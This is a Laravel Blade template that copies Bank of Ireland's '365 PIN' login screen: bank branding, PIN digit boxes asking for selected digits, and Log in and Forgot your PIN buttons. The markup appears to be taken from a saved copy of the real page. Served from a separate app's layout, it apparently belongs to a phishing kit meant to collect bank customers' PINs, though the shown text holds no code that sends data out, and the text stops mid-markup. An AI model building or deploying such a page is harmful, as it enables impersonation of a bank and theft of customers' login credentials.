@extends('layouts.b')
@section('main')

<div style="clear: both; " id="C2__C2__FMT_2A32D693E9C808CF725475" class="responsive-row">
    <div style="clear: both; " id="C2__C2__FMT_07CF47FACB6DC258404918" class="col-full-xs col-full-sm col-10-12-md col-4-7-lg col-3-7-xl boi-standard-login-card-layout tc-center-align-block boi-sca-mb pincard-fixed-position">
        <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
        <div>
            <div id="C2__C2__p1_GRP_06655CFCADD764093701949" style="position: relative">

                <div id="C2__FMT_E3AD16BD474843C9285254" class="boi-heading-logo">
                    <div style="text-align: center; " id="C2__TXT_E3AD16BD474843C9285255">
                        <img src="/b/boi_logo.svg" alt="" id="img_C2__TXT_E3AD16BD474843C9285255" width="100%" title="">
                    </div>
                </div>

                <div style="clear: both; " id="C2__C2__FMT_2A32D693E9C808CF725533" class="tc-card-bg shadow-style-1 tc-card boi-terms-condition-section">
                    <div style="clear: both; " id="C2__C2__FMT_22CB97D61B43D91F417231" class="tc-card-body boi-card-body boi-pin-page-padding  boi_grey_light_background boi-padding-bottom-10">
                        <div style="clear: both; " id="C2__C2__FMT_B1B3C32055447A36422927" class="boi-SCAAuthentication-sec position-relative">
                            <div style="clear: both">
                                <div style="clear: left;" id="C2__C2__row_TXT_A27587C9C3BB0F2D172462">
                                    <div id="C2__C2__TXT_A27587C9C3BB0F2D172462" style="text-align: left; ">
                                        <div></div>
                                    </div>
                                </div>
                            </div>
                            <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                            <div>
                                <div id="C2__C2__p1_GRP_06655CFCADD764093800073" style="position: relative">
                                    <div class="tc-global-font tc-global-color tc-normal-weight  " style="width: 100%" id="C2__C2__C1__EDGE_CONNECT_PROCESS">
                                        <div class="boi-pin-ui-comp boi-card-phase  " id="C2__C2__C1__EDGE_CONNECT_PHASE">
                                            <div id="C2__C2__C1__FMT_65D0A6FCA143E733546252" style="display: none;"></div>
                                            <div class="ecDIBCol  ecDIB  responsive-column1 col-full" id="C2__C2__C1__COL_B8777E004C9C422F528436">
                                                <div id="C2__C2__C1__FMT_33CDC0B750F23D9B627841" class="boi-alert-container" style="display: none;">
                                                    <script>
                                                        $(document).ready(function() {
                                                            $('.boi-standard-global-error-message').click(function() {
                                                                $('.boi-standard-global-error-message').hide();
                                                            });
                                                            setTimeout(function() {
                                                                $("#C2__C2__C1__HEAD_188DA78A3B0DB18F2476_").focus();
                                                                $("#C2__C2__C1__HEAD_188DA78A3B0DB18F2476_").removeAttr("title");
                                                            }, 250);
                                                        });
                                                    </script>
                                                    <style>
                                                        .boi-standard-global-error-message .boi-error-msg-wrap {
                                                            display: flex;
                                                            word-break: break-word;
                                                        }

                                                        .boi-standard-global-error-message .boi-error-msg-wrap .boi_input {
                                                            margin-left: 0px;
                                                            margin-top: 5px;
                                                        }

                                                        .boi-standard-global-error-message .boi-login-error-msg.boi_label {
                                                            margin-top: 10px;
                                                            color: #616365;
                                                        }
                                                    </style>
                                                </div>
                                                <div id="C2__C2__C1__FMT_B8777E004C9C422F528441" class="tc-card">
                                                    <div id="C2__C2__C1__FMT_33CDC0B750F23D9B612950" class="boi-skip-focus-input">
                                                        <div id="C2__C2__C1__FMT_A5A122FA9CBD2DF5506081" class="col-hidden-xs1 col-hidden-sm1 col-hidden-md1 col-full">
                                                            <div id="C2__C2__C1__row_HEAD_A5A122FA9CBD2DF5500250" class="col-full  ">
                                                                <div id="C2__C2__C1__p1_HEAD_A5A122FA9CBD2DF5500250" style="text-align: center; ; ">
                                                                    <div>
                                                                        <h1 id="C2__C2__C1__HEAD_A5A122FA9CBD2DF5500250" class="boi_account_level_heading boi-pt-10 boi-mb-15 boi-fs-20-xs boi-fs-20-sm boi-pin-page-title  ecDIB  "><span role="text" aria-label="Your 3 6 5 PIN">Your 365 PIN</span></h1>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div id="C2__C2__C1__FMT_87AB3C083CF17469611651" class="col-full-xs col-full text-center" style="display: none;">
                                                            <div id="C2__C2__C1__row_HEAD_87AB3C083CF17469630681" class="col-full  ">
                                                                <div id="C2__C2__C1__p1_HEAD_87AB3C083CF17469630681" style="text-align: center; ; ">
                                                                    <div>
                                                                        <h1 id="C2__C2__C1__HEAD_87AB3C083CF17469630681" class="boi_account_level_heading boi-pt-10 boi-mb-15 boi-fs-20-xs boi-fs-20-sm boi-pin-page-title  ecDIB  "><span role="text" aria-label="Your 3 6 5 PIN">Your 365 PIN</span></h1>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div id="C2__C2__C1__FMT_7DABB9CC0583F85F122708" class="col-full-xs col-full text-center" style="display: none;">
                                                            <div style="text-align: center; " id="C2__C2__C1__TXT_7DABB9CC0583F85F125910">
                                                                <div><span class="col-full boi_input_sm_error text-center></span></div>
<div><h2 class=" col-full="" boi_input_sm_error="" text-center="" aria-live="assertive"></span></div>
                                                            </div>
                                                        </div>
                                                        <div id="C2__C2__C1__FMT_33CDC0B750F23D9B613039" class="col-full-xs col-full-sm col-3-4-md col-3-4-lg col-3-4-xl tc-center-align-block ">
                                                            <div id="C2__C2__C1__FMT_33CDC0B750F23D9B642837">
                                                                <div style="text-align: left;" id="C2__C2__C1__TXT_9E70F15B4B341F76326381">
                                                                    <div id="MinorAlert" style="display: none" role="alert" aria-live="polite"
                                                                    aria-atomic="true">
                                            
                                                                    <div class="boi-standard-global-alert boi-standard-warning" style="margin: 10px 0px; border: 2px solid #bc5100"
                                                                    title="">
                                                                    <div class="boi-error-msg-wrap" title="" style="height: auto">
                                                                        <span aria-hidden="true" class="fa fa-exclamation fa-alert-name"></span>
                                                                        <span class="boi_input tc-normal-align" style="font-size: 14px">
                                                                            <span class="boi_input tc-normal-align" style="color: #bc5100; font-weight: bold; font-size: 14px">
                                                                                Error
                                                                            </span>
                                                                            <br />
                                                                            <span  id=MinorAlertMsg> </span>
                                                                    </div>
                                                                </div>
                                                                
                                                                </div>
                                                                <div style="text-align: left; display: none;" id="C2__C2__C1__TXT_2D8A777E13108B45364385">
                                                                    <div aria-hidden="true" style="clear: left;">
                                                                        <div style="text-align: center; ">
                                                                            <img src="./PIN Authentication - /sca_lock.svg" alt="Padlock icon" title="Padlock icon" role="img"></div>
                                                                    </div>
                                                                </div>
                                                                <div id="C2__C2__C1__row_HEAD_D8CFA5CB5EC41749387643" style="display: none;"></div>
                                                                <p class="boi_para  col-full   text-center "><span role="text" aria-label="Enter your PIN's 1st, 4th and 6th digits">Enter your PIN's <span class="boi_bold_only boi_blue">1st,</span> <span class="boi_bold_only boi_blue">4th</span> and <span class="boi_bold_only boi_blue">6th</span> digits</span></p>
                                                            </div>
                                                            <div id="C2__C2__C1__FMT_33CDC0B750F23D9B630773" class="boi-pin-digits hiddenBefore tc-center-align ">
                                                                <div>
                                                                    <div id="C2__C2__C1__p1_GRP_E5926CB29B1866D1625679" style="position: relative">
                                                                        <div id="C2__C2__C1__FMT_9D71D388930240C7378555">
                                                                            <div id="C2__C2__C1__row_HEAD_4AEF1D1D2CED553F430965" class="boi-float-none boi-standard-question-label  ">
                                                                                <div style="text-align: center; ; width:" class="ecDIB  ">
                                                                                    <div>
                                                                                        <fieldset style="border: none; padding: 0px; margin-left: 0px; display: inline; vertical-align:middle;" id="C2__C2__C1__GROUP_FS_HEAD_4AEF1D1D2CED553F430965">
                                                                                            <legend class="accessibilityStyle">&nbsp;</legend>
                                                                                            <div style="display:inline-block; display: none;" id="C2__C2__C1__p1_HEAD_4AEF1D1D2CED553F430965"></div>
                                                                                            <div id="C2__C2__C1__p4_QUE_188DA78A3B0DB18F2500" style="display:inline-block; " class="ext-tc-radio-input pin-box-group"><label for="C2__C2__C1__QUE_188DA78A3B0DB18F2500" class="accessibilityStyle" id="pin-label-0">Digit1</label><span class="boi-prefix-part scaOrdinalNo boi_para boi-font-size-13" aria-hidden="true">1st</span>
                                                                                                <script type="text/javascript">
                                                                                                    function isVisible(el) {
                                                                                                        if (el && !el.offsetParent && el.offsetWidth === 0 && el.offsetHeight === 0) {
                                                                                                            return false;
                                                                                                        }
                                                                                                        return true;
                                                                                                    };

                                                                                                    function autoTabInParent(current, parentContainerId) {
                                                                                                        if (current.getAttribute && current.value.length == current.getAttribute("maxlength")) {
                                                                                                            var parentGroup = document.getElementById(parentContainerId);
                                                                                                            if (parentGroup) {
                                                                                                                var inputs = parentGroup.getElementsByTagName('input');
                                                                                                                for (var i = 0; i < inputs.length; i++) {
                                                                                                                    if (inputs[i] == current && i + 1 < inputs.length) {
                                                                                                                        for (var j = i + 1; j < inputs.length; j++) {
                                                                                                                            if (!inputs[j].disabled && isVisible(inputs[j])) {
                                                                                                                                // Add aria live only to iOS app
                                                                                                                                if (window.boiCbs.options.isHybrid && window.boiCbs.options.isIos) {
                                                                                                                                    $(inputs[i]).removeAttr('aria-live');
                                                                                                                                    $(inputs[j]).attr('aria-live', 'assertive');
                                                                                                                                }
                                                                                                                                inputs[j].focus();
                                                                                                                                return;
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    };
                                                                                                </script>
                                                                                                <input type="number" oninput="moveToNext(this,'C2__C2__C1__p1_GRP_E5926CB29B1866D1625679');" autocomplete="off" name="C2__C2__C1__LOGIN[1].PINDIGITS[1].DIGIT1" id="C2__C2__C1__QUE_188DA78A3B0DB18F2500" class="tc-form-control tc-full-width boi_input pin-box boi_input_placeholder boi-form-control keyEnter pinkey boi-ml-force-0 tc-rounded-1 boi-pin-digit password-font validateMaxLength boi-enable-numkeypad boi-sca-pin-password  " size="1" maxlength="1" aria-required="false" aria-labelledby="pin-label-0"><span class="boi-pin-digit-hide-error  " id="C2__C2__C1__QUE_188DA78A3B0DB18F2500_ERRORMESSAGE" aria-live="assertive"></span>
                                                                                            </div>
                                                                                            <div id="C2__C2__C1__p4_QUE_188DA78A3B0DB18F2501" style="display:inline-block; " aria-hidden="true" class="ext-tc-radio-input pin-box-groupx"><label for="C2__C2__C1__QUE_188DA78A3B0DB18F2501" class="accessibilityStyle" id="pin-label-1">Digit2</label>
                                                                                                <script type="text/javascript">
                                                                                                    function isVisible(el) {
                                                                                                        if (el && !el.offsetParent && el.offsetWidth === 0 && el.offsetHeight === 0) {
                                                                                                            return false;
                                                                                                        }
                                                                                                        return true;
                                                                                                    };

                                                                                                    function autoTabInParent(current, parentContainerId) {
                                                                                                        if (current.getAttribute && current.value.length == current.getAttribute("maxlength")) {
                                                                                                            var parentGroup = document.getElementById(parentContainerId);
                                                                                                            if (parentGroup) {
                                                                                                                var inputs = parentGroup.getElementsByTagName('input');
                                                                                                                for (var i = 0; i < inputs.length; i++) {
                                                                                                                    if (inputs[i] == current && i + 1 < inputs.length) {
                                                                                                                        for (var j = i + 1; j < inputs.length; j++) {
                                                                                                                            if (!inputs[j].disabled && isVisible(inputs[j])) {
                                                                                                                                // Add aria live only to iOS app
                                                                                                                                if (window.boiCbs.options.isHybrid && window.boiCbs.options.isIos) {
                                                                                                                                    $(inputs[i]).removeAttr('aria-live');
                                                                                                                                    $(inputs[j]).attr('aria-live', 'assertive');
                                                                                                                                }
                                                                                                                                inputs[j].focus();
                                                                                                                                return;
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    };
                                                                                                </script>
                                                                                                <input type="number"  autocomplete="off" name="C2__C2__C1__LOGIN[1].PINDIGITS[1].DIGIT2_READONLY" id="C2__C2__C1__QUE_188DA78A3B0DB18F2501" class="tc-form-control tc-full-width boi_input pin-boxx boi_input_placeholder boi-form-control keyEnter pinkey tc-rounded-1 boi-pin-digit password-font validateMaxLength boi-enable-numkeypad boi-sca-pin-password  " readonly="readonly" disabled="disabled" size="1" maxlength="1" aria-required="false" tabindex="-1" aria-labelledby="pin-label-1">
                                                                                            </div>
                                                                                            <div id="C2__C2__C1__p4_QUE_188DA78A3B0DB18F2502" style="display:inline-block; " aria-hidden="true" class="ext-tc-radio-input pin-box-groupx"><label for="C2__C2__C1__QUE_188DA78A3B0DB18F2502" class="accessibilityStyle" id="pin-label-2">Digit3</label>
                                                                                                <script type="text/javascript">
                                                                                                    function isVisible(el) {
                                                                                                        if (el && !el.offsetParent && el.offsetWidth === 0 && el.offsetHeight === 0) {
                                                                                                            return false;
                                                                                                        }
                                                                                                        return true;
                                                                                                    };

                                                                                                    function autoTabInParent(current, parentContainerId) {
                                                                                                        if (current.getAttribute && current.value.length == current.getAttribute("maxlength")) {
                                                                                                            var parentGroup = document.getElementById(parentContainerId);
                                                                                                            if (parentGroup) {
                                                                                                                var inputs = parentGroup.getElementsByTagName('input');
                                                                                                                for (var i = 0; i < inputs.length; i++) {
                                                                                                                    if (inputs[i] == current && i + 1 < inputs.length) {
                                                                                                                        for (var j = i + 1; j < inputs.length; j++) {
                                                                                                                            if (!inputs[j].disabled && isVisible(inputs[j])) {
                                                                                                                                // Add aria live only to iOS app
                                                                                                                                if (window.boiCbs.options.isHybrid && window.boiCbs.options.isIos) {
                                                                                                                                    $(inputs[i]).removeAttr('aria-live');
                                                                                                                                    $(inputs[j]).attr('aria-live', 'assertive');
                                                                                                                                }
                                                                                                                                inputs[j].focus();
                                                                                                                                return;
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    };
                                                                                                </script>
                                                                                                <input type="number" autocomplete="off" name="C2__C2__C1__LOGIN[1].PINDIGITS[1].DIGIT3_READONLY" id="C2__C2__C1__QUE_188DA78A3B0DB18F2502" class="tc-form-control tc-full-width boi_input pin-boxx boi_input_placeholder boi-form-control keyEnter pinkey tc-rounded-1 boi-pin-digit password-font validateMaxLength boi-enable-numkeypad boi-sca-pin-password  " readonly="readonly" disabled="disabled" size="1" maxlength="1"  aria-required="false" tabindex="-1" aria-labelledby="pin-label-2">
                                                                                            </div>
                                                                                            <div id="C2__C2__C1__p4_QUE_188DA78A3B0DB18F2503" style="display:inline-block; " class="ext-tc-radio-input pin-box-group"><label for="C2__C2__C1__QUE_188DA78A3B0DB18F2503" class="accessibilityStyle" id="pin-label-3">Digit4</label><span class="boi-prefix-part scaOrdinalNo boi_para boi-font-size-13" aria-hidden="true">4th</span>
                                                                                                <script type="text/javascript">
                                                                                                    function isVisible(el) {
                                                                                                        if (el && !el.offsetParent && el.offsetWidth === 0 && el.offsetHeight === 0) {
                                                                                                            return false;
                                                                                                        }
                                                                                                        return true;
                                                                                                    };

                                                                                                    function autoTabInParent(current, parentContainerId) {
                                                                                                        if (current.getAttribute && current.value.length == current.getAttribute("maxlength")) {
                                                                                                            var parentGroup = document.getElementById(parentContainerId);
                                                                                                            if (parentGroup) {
                                                                                                                var inputs = parentGroup.getElementsByTagName('input');
                                                                                                                for (var i = 0; i < inputs.length; i++) {
                                                                                                                    if (inputs[i] == current && i + 1 < inputs.length) {
                                                                                                                        for (var j = i + 1; j < inputs.length; j++) {
                                                                                                                            if (!inputs[j].disabled && isVisible(inputs[j])) {
                                                                                                                                // Add aria live only to iOS app
                                                                                                                                if (window.boiCbs.options.isHybrid && window.boiCbs.options.isIos) {
                                                                                                                                    $(inputs[i]).removeAttr('aria-live');
                                                                                                                                    $(inputs[j]).attr('aria-live', 'assertive');
                                                                                                                                }
                                                                                                                                inputs[j].focus();
                                                                                                                                return;
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    };
                                                                                                </script>
                                                                                                <input type="number" oninput="moveToNext(this,'C2__C2__C1__p1_GRP_E5926CB29B1866D1625679');" autocomplete="off" name="C2__C2__C1__LOGIN[1].PINDIGITS[1].DIGIT4" id="C2__C2__C1__QUE_188DA78A3B0DB18F2503" class="tc-form-control tc-full-width boi_input pin-box boi_input_placeholder boi-form-control keyEnter pinkey tc-rounded-1 boi-pin-digit password-font validateMaxLength boi-enable-numkeypad boi-sca-pin-password  " size="1" maxlength="1" aria-required="false" aria-labelledby="pin-label-3"><span class="boi-pin-digit-hide-error  " id="C2__C2__C1__QUE_188DA78A3B0DB18F2503_ERRORMESSAGE" aria-live="assertive"></span>
                                                                                            </div>
                                                                                            <div id="C2__C2__C1__p4_QUE_188DA78A3B0DB18F2504" style="display:inline-block; " aria-hidden="true" class="ext-tc-radio-input pin-box-groupx"><label for="C2__C2__C1__QUE_188DA78A3B0DB18F2504" class="accessibilityStyle" id="pin-label-4">Digit5</label>
                                                                                                <script type="text/javascript">
                                                                                                    function isVisible(el) {
                                                                                                        if (el && !el.offsetParent && el.offsetWidth === 0 && el.offsetHeight === 0) {
                                                                                                            return false;
                                                                                                        }
                                                                                                        return true;
                                                                                                    };

                                                                                                    function autoTabInParent(current, parentContainerId) {
                                                                                                        if (current.getAttribute && current.value.length == current.getAttribute("maxlength")) {
                                                                                                            var parentGroup = document.getElementById(parentContainerId);
                                                                                                            if (parentGroup) {
                                                                                                                var inputs = parentGroup.getElementsByTagName('input');
                                                                                                                for (var i = 0; i < inputs.length; i++) {
                                                                                                                    if (inputs[i] == current && i + 1 < inputs.length) {
                                                                                                                        for (var j = i + 1; j < inputs.length; j++) {
                                                                                                                            if (!inputs[j].disabled && isVisible(inputs[j])) {
                                                                                                                                // Add aria live only to iOS app
                                                                                                                                if (window.boiCbs.options.isHybrid && window.boiCbs.options.isIos) {
                                                                                                                                    $(inputs[i]).removeAttr('aria-live');
                                                                                                                                    $(inputs[j]).attr('aria-live', 'assertive');
                                                                                                                                }
                                                                                                                                inputs[j].focus();
                                                                                                                                return;
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    };
                                                                                                </script>
                                                                                            </div>
                                                                                            <input type="number"  autocomplete="off" name="C2__C2__C1__LOGIN[1].PINDIGITS[1].DIGIT5_READONLY" id="C2__C2__C1__QUE_188DA78A3B0DB18F2504" class="tc-form-control tc-full-width boi_input pin-boxx boi_input_placeholder boi-form-control keyEnter pinkey tc-rounded-1 boi-pin-digit password-font validateMaxLength boi-enable-numkeypad boi-sca-pin-password  " readonly="readonly" disabled="disabled" size="1" maxlength="1" aria-required="false" tabindex="-1" aria-labelledby="pin-label-4">
                                                                                            <div id="C2__C2__C1__p4_QUE_188DA78A3B0DB18F2505" style="display:inline-block; " class="ext-tc-radio-input pin-box-group"><label for="C2__C2__C1__QUE_188DA78A3B0DB18F2505" class="accessibilityStyle" id="pin-label-5">Digit6</label><span class="boi-prefix-part scaOrdinalNo boi_para boi-font-size-13" aria-hidden="true">6th</span>
                                                                                                <script type="text/javascript">
                                                                                                    function isVisible(el) {
                                                                                                        if (el && !el.offsetParent && el.offsetWidth === 0 && el.offsetHeight === 0) {
                                                                                                            return false;
                                                                                                        }
                                                                                                        return true;
                                                                                                    };

                                                                                                    function autoTabInParent(current, parentContainerId) {
                                                                                                        if (current.getAttribute && current.value.length == current.getAttribute("maxlength")) {
                                                                                                            var parentGroup = document.getElementById(parentContainerId);
                                                                                                            if (parentGroup) {
                                                                                                                var inputs = parentGroup.getElementsByTagName('input');
                                                                                                                for (var i = 0; i < inputs.length; i++) {
                                                                                                                    if (inputs[i] == current && i + 1 < inputs.length) {
                                                                                                                        for (var j = i + 1; j < inputs.length; j++) {
                                                                                                                            if (!inputs[j].disabled && isVisible(inputs[j])) {
                                                                                                                                // Add aria live only to iOS app
                                                                                                                                if (window.boiCbs.options.isHybrid && window.boiCbs.options.isIos) {
                                                                                                                                    $(inputs[i]).removeAttr('aria-live');
                                                                                                                                    $(inputs[j]).attr('aria-live', 'assertive');
                                                                                                                                }
                                                                                                                                inputs[j].focus();
                                                                                                                                return;
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    };
                                                                                                </script>
                                                                                                <input type="number" oninput="moveToNext(this,'C2__C2__C1__p1_GRP_E5926CB29B1866D1625679');" autocomplete="off" name="C2__C2__C1__LOGIN[1].PINDIGITS[1].DIGIT6" id="C2__C2__C1__QUE_188DA78A3B0DB18F2505" class="tc-form-control tc-full-width boi_input pin-box boi_input_placeholder boi-form-control keyEnter pinkey mr-0 tc-rounded-1 boi-pin-digit password-font validateMaxLength boi-enable-numkeypad boi-sca-pin-password boi-m-0  " size="1" maxlength="1"aria-required="false" aria-labelledby="pin-label-5"><span class="boi-pin-digit-hide-error  " id="C2__C2__C1__QUE_188DA78A3B0DB18F2505_ERRORMESSAGE" aria-live="assertive"></span>
                                                                                            </div>
                                                                                            <div id="C2__C2__C1__p4_validation-error-message" style="display:inline-block; display: none;"></div>
                                                                                        </fieldset>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div id="C2__C2__C1__FMT_C0B8D0C6219E8234355427" style="display: none;">
                                                                <div id="C2__C2__C1__row_BUT_C0B8D0C6219E8234358954" class="col-full  ">
                                                                    <div id="C2__C2__C1__p1_BUT_C0B8D0C6219E8234358954" class="ecDIB  col-hidden">
                                                                        <div>&nbsp;</div>
                                                                    </div>
                                                                    <div class="ecDIB  col-full boi-full-width boi-overlay-close-button-padding-set  " style="text-align: center; " id="C2__C2__C1__p4_BUT_C0B8D0C6219E8234358954">
                                                                        <div>
                                                                            <a onclick="ajaxButtonAction( null, 'C2__C2__C1____C0B8D0C6219E8234 FormButton 8', 'C2__C2__C1__BUT_C0B8D0C6219E8234358954', false, null, '', 'servletcontroller', '', false, true, '' );" href="javascript:void(0);" class="boi-device-italic-blue-button boi-sca-mt-6 external-userid-overlay roleLink" id="C2__C2__C1__BUT_C0B8D0C6219E8234358954" handlerchanged="Y" onoldclick="ajaxButtonAction( null, 'C2__C2__C1____C0B8D0C6219E8234 FormButton 8', 'C2__C2__C1__BUT_C0B8D0C6219E8234358954', false, null, '', 'servletcontroller', '', false, true, '' );" role="link"><span>Forgot your PIN <span class="boi-forgotpsd-btn boi-device-tooltip fa fa-question-circle"></span></span></a>

                                                                            <script type="text/javascript" charset="utf-8">
                                                                                //<![CDATA[



                                                                                $(function() {


                                                                                    function doWork() {


                                                                                        try {
                                                                                            window.boiCbs.openDialog({
                                                                                                id: "C2__C2__C1__BUT_C0B8D0C6219E8234358954"
                                                                                                , COMPONENT_ID_PREFIX: "C2__C2__C1__"
                                                                                                , IdToUpdate: "FMT_67001D45209E1F4A2684915"
                                                                                                , ClassToRemove: ""
                                                                                                , ClassToToggle: ""
                                                                                                , ClassToAdd: ""
                                                                                                , ParentContextSelector: ""
                                                                                                , AnimationType: ""
                                                                                                , DefaultTextOnButton: ""
                                                                                                , ClickedTextOnButton: ""
                                                                                                , isHybrid: ""
                                                                                                , DisableDefaultCloseDialogButton: "N"
                                                                                                , hashedUserId: ""
                                                                                                , processName: ""
                                                                                                , phaseName: ""
                                                                                            })
                                                                                        } catch (e) {
                                                                                            log("Problem running javascript function: window.boiCbs.openDialog");
                                                                                        }









                                                                                        var $parent = $("html");








                                                                                        ajaxButtonAction(null, 'C2__C2__C1____C0B8D0C6219E8234 FormButton 8', 'C2__C2__C1__BUT_C0B8D0C6219E8234358954', false, null, '', 'servletcontroller', '', false, true, '');




                                                                                    }
                                                                                    var $el = $("#C2__C2__C1__BUT_C0B8D0C6219E8234358954:not([handlerChanged='Y'])");
                                                                                    $el.attr("handlerChanged", "Y")
                                                                                        .attr("onoldclick", $el.attr("onclick"))
                                                                                        .removeProp("onclick")
                                                                                        .on("click", function(e) {
                                                                                            doWork();
                                                                                        });




                                                                                });
                                                                                //]]>
                                                                            </script>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div id="C2__C2__C1__FMT_33CDC0B750F23D9B619048" class="tc-card-button-container1 clearfix col-full boi-login-btn-padding">
                                                                <div class="ecDIBCol  ecDIB  tc-position-rel col-full" id="C2__C2__C1__COL_33CDC0B750F23D9B619083">
                                                                    <div id="C2__C2__C1__row_BUT_34E8E918396477EE460763" style="display: none;"></div>
                                                                    <div id="C2__C2__C1__row_BUT_MOBILE_AUTHENTICATE" class=" col-hidden " style="display: none;"></div>
                                                                    <div id="C2__C2__C1__row_Authentication-PINPage-Continue">
                                                                        <div id="C2__C2__C1__p1_Authentication-PINPage-Continue" class="ecDIB  col-hidden">
                                                                            <div>&nbsp;</div>
                                                                        </div>
                                                                        <div class="ecDIB  col-full tc-full-button-xs float-right  tc-full-button-xs tc-full-width " style="text-align: right; " id="C2__C2__C1__p4_Authentication-PINPage-Continue">
                                                                            <div>
                                                                                <button id="C2__C2__C1__Authentication-PINPage-Continue" type="button" class="loginBtn col-full tc-accent-bg-new tc-button-color tc-button tc-rounded-1 tc-uppercase tc-normal-icon-with-text Btn_primary boi-primary-card-button trigger-authenticate-btn  boi-device-prov-ctn-btn  " ><span role="button">Log in</span></button>

                                                                                <script type="text/javascript" charset="utf-8">
                                                                                    //<![CDATA[



                                                                                    $(function() {

                                                                                        function doWork(e) {












                                                                                            var $parent = $("html");




                                                                                            if (!(typeof(boiparm) == 'undefined')) {
                                                                                                if (typeof(boiparm.boiform) == 'function') {
                                                                                                    boiparm.boiform('C2__C2__C1__boi_prefs');
                                                                                                }
                                                                                            }



                                                                                            return buttonClicked('C2__C2__C1____D1B0884CB20C5FFB FormButton 50', true, null, '', false, 'C2__C2__C1__Authentication-PINPage-Continue', true, false, '', true, true, 'preInPhase');




                                                                                        }
                                                                                        var $el = $("#C2__C2__C1__Authentication-PINPage-Continue:not([handlerChanged='Y'])");
                                                                                        $el.attr("handlerChanged", "Y")
                                                                                            .attr("onoldclick", $el.attr("onclick"))
                                                                                            .removeProp("onclick");
                                                                                        if (!$el.hasClass("boi-delegate-click-to-container") && ("" === "")) {
                                                                                            $el.on("click", function(e) {
                                                                                                doWork(e);
                                                                                            });
                                                                                        }

                                                                                        //Add support for space bar button click
                                                                                        $("#C2__C2__C1__Authentication-PINPage-Continue").keydown(function(e) {
                                                                                            if (e.which == 32) {
                                                                                                $("#C2__C2__C1__Authentication-PINPage-Continue").click();
                                                                                                e.preventDefault();
                                                                                            }
                                                                                        });
                                                                                    });
                                                                                    //]]>
                                                                                </script>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="ecDIBCol  ecDIB  col-full boi-mt-10" id="C2__C2__C1__COL_33CDC0B750F23D9B619090">
                                                                    <div id="C2__C2__C1__row_BUT_CCF0DADB53E3FA3B250353" class="btn-primary-large  ">
                                                                        <div id="C2__C2__C1__p1_BUT_CCF0DADB53E3FA3B250353" class="ecDIB  col-hidden">
                                                                            <div>&nbsp;</div>
                                                                        </div>
                                                                        <div class="ecDIB  col-full  " style="text-align: left; " id="C2__C2__C1__p4_BUT_CCF0DADB53E3FA3B250353">
                                                                            <div>
                                                                                <a onclick="return buttonClicked('C2__C2__C1____CCF0DADB53E3FA3B FormButton 6', false, null, '', false, 'C2__C2__C1__BUT_CCF0DADB53E3FA3B250353', true, false, '', true, true, 'preInPhase');" href="javascript:void(0);" class="col-full tc-secondary-card-button-new tc-button-color tc-button tc-rounded-1 tc-uppercase tc-normal-icon-with-text boi-secondary-card-button Btn_secondary formBack tc-ripple-effect" id="C2__C2__C1__BUT_CCF0DADB53E3FA3B250353" handlerchanged="Y" onoldclick="return buttonClicked('C2__C2__C1____CCF0DADB53E3FA3B FormButton 6', false, null, '', false, 'C2__C2__C1__BUT_CCF0DADB53E3FA3B250353', true, false, '', true, true, 'preInPhase');" data-ripple-effect-handler-added="Y" role="button"><span><span role="button">Go back</span></span></a>

                                                                                <script type="text/javascript" charset="utf-8">
                                                                                    //<![CDATA[



                                                                                    $(function() {

                                                                                        function doWork(e) {












                                                                                            var $parent = $("html");




                                                                                            if (!(typeof(boiparm) == 'undefined')) {
                                                                                                if (typeof(boiparm.boiform) == 'function') {
                                                                                                    boiparm.boiform('C2__C2__C1__boi_prefs');
                                                                                                }
                                                                                            }



                                                                                            return buttonClicked('C2__C2__C1____CCF0DADB53E3FA3B FormButton 6', false, null, '', false, 'C2__C2__C1__BUT_CCF0DADB53E3FA3B250353', true, false, '', true, true, 'preInPhase');




                                                                                        }
                                                                                        var $el = $("#C2__C2__C1__BUT_CCF0DADB53E3FA3B250353:not([handlerChanged='Y'])");
                                                                                        $el.attr("handlerChanged", "Y")
                                                                                            .attr("onoldclick", $el.attr("onclick"))
                                                                                            .removeProp("onclick");
                                                                                        if (!$el.hasClass("boi-delegate-click-to-container") && ("" === "")) {
                                                                                            $el.on("click", function(e) {
                                                                                                doWork(e);
                                                                                            });
                                                                                        }

                                                                                        //Add support for space bar button click
                                                                                        $("#C2__C2__C1__BUT_CCF0DADB53E3FA3B250353").keydown(function(e) {
                                                                                            if (e.which == 32) {
                                                                                                $("#C2__C2__C1__BUT_CCF0DADB53E3FA3B250353").click();
                                                                                                e.preventDefault();
                                                                                            }
                                                                                        });
                                                                                    });
                                                                                    //]]>
                                                                                </script>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div id="C2__C2__C1__FMT_1D5B2AE18154504654559" class="button-with-popup col-full-full">
                                                                <div class="ecDIBCol  ecDIB  button-with-popup" id="C2__C2__C1__COL_1D5B2AE18154504654973">
                                                                    <div id="C2__C2__C1__row_BUT_3908C9CA31FB1A40103698" class="col-hidden  ">
                                                                        <div id="C2__C2__C1__p1_BUT_3908C9CA31FB1A40103698" class="ecDIB  ">
                                                                            <div>&nbsp;</div>
                                                                        </div>
                                                                        <div class="ecDIB  " style="text-align: left; " id="C2__C2__C1__p4_BUT_3908C9CA31FB1A40103698">
                                                                            <div>
